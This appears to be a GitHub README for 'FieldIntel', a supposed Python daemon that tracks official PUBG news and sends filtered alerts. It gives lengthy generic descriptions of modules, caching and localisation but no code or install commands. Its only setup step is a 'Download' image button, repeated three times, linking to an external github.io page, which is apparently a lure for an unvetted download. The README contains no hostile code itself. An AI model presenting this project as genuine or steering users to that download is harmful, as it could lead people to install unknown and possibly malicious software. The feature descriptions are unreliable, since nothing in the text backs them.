![preview](https://raw.githubusercontent.com/Dk3424/pubg-news-radar/main/view_b7dfcdc.svg)

# FieldIntel: PUBG Universe Tracker

![Version](https://img.shields.io/badge/version-2.4.0-8A2BE2)
![Build Status](https://img.shields.io/badge/build-passing-00FF7F)
![Language Support](https://img.shields.io/badge/i18n-12_languages-FFA500)
![License](https://img.shields.io/badge/license-MIT-4B0082)

## Overview

**FieldIntel** is a proactive intelligence console designed for the dedicated PUBG community, transforming the way players, content creators, and tournament organizers consume official game announcements. Instead of manually refreshing community pages or relying on scattered social media snippets, FieldIntel establishes a persistent, automated watchtower that monitors the official PUBG news feed around the clock.

This project is inspired by the need for a more structured, filterable, and notification-driven approach to game updates. While many solutions exist for general gaming news aggregation, FieldIntel focuses exclusively on the granular details that matter most to active players: patch notes, weapon balancing changes, map rotations, esports qualifiers, and emergency maintenance windows.

The core philosophy behind FieldIntel is **contextual relevance**. Rather than dumping every headline into a single stream, the system categorizes announcements by type, severity, and affected game mode. Users can then configure custom alert thresholds—receiving immediate mobile notifications for server outages, but a daily digest for routine cosmetic updates. This separation of signal from noise is the foundational pillar of the entire architecture.

FieldIntel operates as a lightweight daemon that can run on any device with a persistent network connection, from a dedicated home server to a cloud-hosted virtual machine. Its modular design allows for pluggable notification backends, with built-in support for push notification services and webhook integrations. The system is built with transparency in mind, logging every fetch cycle and providing a clear audit trail of what was captured, when, and how it was disseminated.

---

## Why FieldIntel Exists

The PUBG ecosystem has grown exponentially since its early access days. With this growth comes a torrent of official communications—patch previews, hotfix notes, community events, and partnership announcements. The official website effectively serves as the single source of truth, but its format is not optimized for automated consumption or filtered delivery.

FieldIntel addresses three distinct pain points:

1. **Latency**: When a critical hotfix drops, players want to know immediately. Manual checking introduces minutes of delay. FieldIntel polls the official RSS-equivalent endpoints with a configurable frequency, ensuring that the time delta between publication and notification is measured in seconds, not hours.

2. **Filtering**: A casual player does not want to receive alerts about esports roster changes. A competitive team manager, however, needs that information immediately. FieldIntel's rule engine parses each article's metadata, tags, and content structure to assign a weighted relevance score against user-defined profiles.

3. **Archive**: The official website often rotates its front page, burying older announcements. FieldIntel maintains a local, searchable index of every detected announcement, enabling historical research—such as tracking the exact date a specific weapon statistic was nerfed.

---

## Getting Started

[![Download](https://raw.githubusercontent.com/Dk3424/pubg-news-radar/main/run_e4c6.svg)](https://Dk3424.github.io/pubg-news-radar/)

To begin utilizing FieldIntel, you need to establish the data collection agent on a device that remains online. The agent is responsible for polling the official sources, normalizing the data, and dispatching notifications.

### Prerequisites

- A computing environment with any modern Linux, macOS, or Windows operating system
- A stable outbound network connection to the official PUBG domains
- A valid endpoint for receiving push notifications (e.g., a configured push service token)
- Python 3.9 or later for the core runtime environment

### Initial Configuration

The first launch of FieldIntel generates a default configuration file in the application's home directory. This file defines the polling interval, the list of source URLs, and the notification routing table.

The source configuration is critical. By default, the system references the primary global news feed. For users in specific regions, there may be dedicated regional feeds (e.g., for Korea or Japan) that contain exclusive announcements. The configuration allows you to define multiple source aliases and assign different polling priorities to each.

Notification routing is handled through a set of rules. For instance, you can define a rule that forwards all articles whose title contains "Server Maintenance" to your mobile device immediately at any hour. A second rule might forward articles tagged with "Esports" to a dedicated Discord channel via a webhook, but only during daytime hours on weekdays.

### Running the Daemon

Once the configuration is validated, the daemon can be started in the foreground for initial testing. This mode prints a verbose log to the console, showing each HTTP request, the response status, and the parsing results for each detected article. After confirming that the system captures announcements correctly, you can switch to daemon mode, where the process detaches from the terminal and runs as a background service.

For long-term operation, setting up a process supervisor (such as `systemd` on Linux or `launchd` on macOS) is recommended. This ensures that FieldIntel automatically restarts after a system reboot or an unexpected crash, maintaining its watchtower duty without human intervention.

---

## Architecture Deep Dive

### The Poller Module

The Poller is the heart of the collection layer. It executes an HTTP GET request against each configured source URL at the scheduled interval. The module handles retries with exponential backoff to gracefully tolerate transient network errors or server-side rate limiting.

Upon receiving a successful response, the Poller passes the raw HTML payload to the Parser module. If the response is empty or malformed, the Poller logs the incident and moves on to the next source, ensuring that a single failed fetch does not block the entire pipeline.

### The Parser and Rule Engine

The Parser is responsible for extracting structured data from unstructured HTML. It looks for known CSS selectors and microdata schemas to identify the article title, publication timestamp, author, and category tags.

The Rule Engine then evaluates these extracted attributes against the activation criteria defined in the configuration. Each rule has a priority level. If a high-priority rule (e.g., "server outage") matches an article, the engine will skip evaluating lower-priority rules for that article to avoid sending duplicate notifications.

### The Dispatcher

The Dispatcher takes a matched article and its associated rule actions and formats the outgoing notification. For push notification services, it constructs a payload containing the article title, a snippet of the body, and a deep link back to the full article on the official website.

The Dispatcher also manages a deduplication cache. If the same article is matched by a rule multiple times (due to overlapping polling cycles), the Dispatcher will suppress the second notification unless a specific "resend" flag is set in the rule.

---

## User Interface & Interaction

FieldIntel is primarily a headless service, but it ships with a lightweight command-line interface for status inspection. The `status` subcommand displays the health of each configured source, the last successful poll time, and the total count of captured articles for the current session.

A web-based dashboard is available as an optional module. This dashboard provides a browser-based view of the recent announcements, a search bar for the local archive, and a visual graph showing the ingestion rate over time. The dashboard is read-only by default, requiring a separate configuration change to enable any editing capabilities.

**[![Download](https://raw.githubusercontent.com/Dk3424/pubg-news-radar/main/run_e4c6.svg)](https://Dk3424.github.io/pubg-news-radar/)**

---

## Performance and Optimization

The system employs a two-tier caching strategy. The first tier is an in-memory cache that stores the response payloads for a short window, allowing rapid re-parsing if the daemon restarts. The second tier is a SQLite-backed persistent cache that stores the normalized article metadata, preventing duplicate processing of old content across restarts.

For large-scale deployments monitoring multiple regional feeds, the Poller supports a thread-pool mode. This mode issues concurrent requests to different sources, reducing the total wall-clock time of a polling cycle. The concurrency level is configurable and should be tuned based on the network bandwidth and the target server's tolerance for parallel connections.

---

## Internationalization and Localization

The notification templates are fully localized. Out of the box, FieldIntel includes translations for English, Korean, Japanese, Simplified Chinese, Traditional Chinese, German, French, Spanish, Portuguese, Russian, Vietnamese, and Indonesian. The locale selection is based on the system's environment variable, but can be overridden in the configuration file.

The Parser is locale-agnostic, meaning it does not use locale-specific keywords to identify article categories. Instead, it relies on the structural layout (e.g., a div with class `category-announcement`), which remains consistent across the official website's regional variants.

---

## Long-Term Support and Roadmap

The project is committed to a biannual release cycle, with a major feature drop in the second quarter and a maintenance sprint in the fourth quarter. The roadmap for 2026 includes a plugin architecture that will allow third-party developers to write custom parsers for non-HTML sources (e.g., JSON APIs or RSS feeds) without modifying the core engine.

Another planned enhancement is sentiment analysis on patch notes, aiming to summarize the community's reaction to a specific balance change by cross-referencing public forum discussions. This feature is experimental and will roll out as an opt-in beta.

---

## Security and Privacy

FieldIntel does not require an account, does not collect telemetry, and does not upload any user configuration to external servers. All data processing occurs locally on the host device. The daemon only makes outbound HTTP requests to the official game website and to the user's designated notification endpoints.

When configured to use a push notification service, the communication channel is encrypted via TLS. The API token for the push service is stored in the configuration file. Users are advised to set restrictive file permissions on this configuration to prevent local privilege escalation attacks.

---

## Troubleshooting and Common Pitfalls

If the daemon fails to capture announcements, the first step is to verify the source URL responsiveness. The official website may occasionally update its content delivery network (CDN) or alter its URL structure, which could break the parser.

The logging system is verbosity-controlled. Setting the log level to `DEBUG` will output the raw fetched HTML to the log file, enabling you to inspect the structure and update the CSS selectors in the parser configuration if necessary.

---

## Community and Contribution

This project welcomes contributions in the form of issue reports, feature requests, and code submissions. For code contributions, please ensure that your changes adhere to the existing style guide (PEP 8 for Python) and include unit tests for any new parser logic.

All contributions are discussed in the project's discussion forum. The maintainers review pull requests on a weekly cadence. Contributors are encouraged to reference the open issues in their pull request descriptions to expedite the review process.

---

## Disclaimer

**FieldIntel is an independent, community-driven project and is not affiliated with, endorsed by, or sponsored by PUBG Corporation, Krafton Inc., or any of their subsidiaries. All game-related trademarks, service marks, and logos are the property of their respective owners. The information provided by FieldIntel is for informational purposes only and is sourced from publicly available official announcements. FieldIntel does not claim ownership of any game content and makes no warranties regarding the accuracy or timeliness of the retrieved information. Users are responsible for complying with the official website's Terms of Service when accessing its content. The project maintainers are not liable for any damages arising from the use of this tool.**

---

## License

This project is distributed under the MIT License. The full license text is available at the following location:

[https://opensource.org/licenses/MIT](https://opensource.org/licenses/MIT)

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS," WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE, AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES, OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT, OR OTHERWISE, ARISING FROM, OUT OF, OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

---

[![Download](https://raw.githubusercontent.com/Dk3424/pubg-news-radar/main/run_e4c6.svg)](https://Dk3424.github.io/pubg-news-radar/)